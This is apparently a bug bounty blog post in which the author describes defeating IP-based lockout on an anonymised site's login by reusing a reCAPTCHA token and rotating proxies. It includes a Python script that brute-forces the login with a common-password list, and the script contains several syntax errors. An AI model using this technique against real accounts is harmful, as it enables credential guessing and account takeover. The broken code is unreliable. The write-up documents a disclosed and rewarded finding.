---
date: 2020-07-26 22:55:45
layout: post
title: Ip Rotation Bypass
description: Ip rotation to bypass ip based check
image: https://i.ibb.co/xXt8WMK/rotate.jpg
optimized_image: https://i.ibb.co/xXt8WMK/rotate.jpg
category: BugBounty
tags:
  - bughunting
  - bugbounty
  - webapp
author: shivangx01b
---

## Bypassing Ip based protection for login using simple python script

Hey guys I'm back with my another finding and also another one which does not implement google recaptcha properly and made this attack possible ...will see how.
We will say this traget as "private.com" through out the article. So let's jump into it !

![Alt Text](https://media.giphy.com/media/CjmvTCZf2U3p09Cn0h/giphy.gif)

Like always whenever I hunt on any program I start with the main web app and check out their stuffs there...well why not ?
So I jumoed to login created an accout and started to  check if web app implements rate limit or not ...
Well web app says that it implements google recaptcha so I thought ..well I try to remove header from the request and removed that recaptcha part from json request..like

- Original json request:
```
{"email": "anyuser@gmail.com", "password": "letbreakit12?", "recaptchaToken": "03AGdBq27wZv0tXXXXXXXXXXXXXX", "recaptchaVersion": "v3"}
```

- To:
```
{"email": "anyuser@gmail.com", "password": "letbreakit12?",  "recaptchaVersion": "v3"}
```

But no luck 

- Response:
```
{"error":"recaptchaToken not found"}
```
Next thing I checked if web app reuses this recptcha?
And well yes ...now response was like 

- Response:
```
{"error":"Incorrect email/Password"}
```
![Alt Text](https://media.giphy.com/media/dLolp8dtrYCJi/giphy.gif)

Now the next thing remains is to check it we can bruteforce this ...Well after 3 ~ 4 tried including the above requests so total like ~ 7 requests I got response like 

```
{"error":"Something went wrong, Ip 47.1.X.x" is added to blacklist try again later"}
```
From this point I thought well it blocked my Ip what about other ?
So I tried to login with my phone data with random password and correct email and got response as

```
{"error":"Incorrect email/Password"}
```
So now I know what to do ;)

![Alt Text](https://media.giphy.com/media/BlWF2vzpIPB0A/giphy.gif)

- Now I had two options either use:
  - IpRotate which is cool extension which uses aws api gatways and proxy your traffic with unique ips 
  - Create a script (as most time internal teams would not like to install a extension for a specific bug)

So I made the following simple python3 script which proxies your every login attempt through different ips 

```python

from proxy_requests.proxy_requests import ProxyRequests
import Queue
import sys

q = Queue.Queue()

passwordList = open('1k_most_common.txt','r').read().splitlines()
total = len(passwordList)


def attack(url):
   try :
       Pass = q.get()
       r = ProxyRequests(url)
       r.set_headers({"Connection": "close", 
                      "Accept": "application/json, text/plain, */*", 
                      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", 
                      "Content-Type": "application/json;charset=UTF-8", 
                      "Origin": "https://private.com", 
                      "Sec-Fetch-Site": "same-site", 
                      "Sec-Fetch-Mode": "cors", 
                      "Sec-Fetch-Dest": "empty", 
                      "Referer": "https://private.com/login", 
                      " Accept-Encoding": "gzip, deflate", 
                      "Accept-Language": "en-US,en;q=0.9",
                      "Cookie " : "__cfduid": "dc7914404b4b8af17d2b615325ec94cbf1596976181", "connect.sid": "s%3Aqcg54CJ2isBko1u1YNhaPG0bhX9R9Wmi.8XeOBqwBtDjReQFjOwpK8s6AnRPVO4BJfghJClZEcio"}

       r.post_with_headers({"email": "anyuser@gmail.com", "password": "" + str(Pass) + "", "recaptchaToken": "03AGdBq27wZv0tXXXXXXXXXXXXXX", "recaptchaVersion": "v3"})

       if r.get_status_code() == 401 or r.get_status_code() == 429:
                     continue
       if r.get_status_code() == 302:
                     print ("[!] Password Found !: " + str(Pass))
    except Queue.Empty :
	sys.exit()
   
def push_pass():

   for password in passwordList :
        q.put(password.strip())

def main():
   push_pass()
   url = "https://api.private.com/api/v2/login"
   for i in range(total):
       attack(url)
        

if '__name__' == '__main__': 
    main()
```
I didn't made it fast which I could or you could make a simple bash script with calls curl and a proxy list via which curl proxies your traffic...well I just had to show that even after like 12 - 20 requests web app is still allowing me for another login attempt


- Reported the bug 
Accepted and bounty awarded $_$

- Takeaway
  - Trying new thing helps

Hope you guys learned seomthing new from this post :)
See you next time !

![Alt Text](https://media.giphy.com/media/KEkCtOMhkdze5azTMa/giphy.gif)
